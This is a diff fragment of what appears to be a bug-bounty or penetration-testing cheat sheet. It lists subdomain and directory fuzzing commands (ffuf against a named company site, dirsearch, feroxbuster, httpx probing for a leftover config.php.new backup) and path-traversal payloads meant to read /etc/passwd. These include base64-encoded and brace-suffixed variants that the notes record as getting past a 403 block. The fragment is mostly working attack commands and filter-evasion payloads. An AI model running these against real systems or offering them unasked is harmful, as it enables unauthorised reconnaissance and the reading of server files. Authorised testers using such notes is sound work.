@@ -58,7 +58,7 @@ after finding results but them in /etc/hosts on the same ip of example.com and t
 7- cat live-subs.txt | dirsearch --stdin
 8- ffuf -u https://www.workramp.com/FUZZ -w wordlist.txt -mc 200,403,301,302 -c true -v -o output.txt
 9- ./feroxbuster -u http://127.1 --depth 2 -B --no-state -A -k  -w extensions.txt	=> gather all extension in one file and go on
-
+cat allsubdomains | httpx -path '/common/config.php.new'
 cat allsubdomains | httpx -title -fr 
 ------------------------------------------------------------------------------------------------------------------------------------
 Scan for S3 buckets 
@@ -1220,6 +1220,7 @@ Blind Sqli
 -------------------------------------------------------------------------------------------------------------------------------------------------
 path traversal 
 httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
+
 file=../../../../../../etc/passwd => 403
 file=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==	=> base64 encoding => 200
 ../../../../../../../../etc/passwd{{	=>200
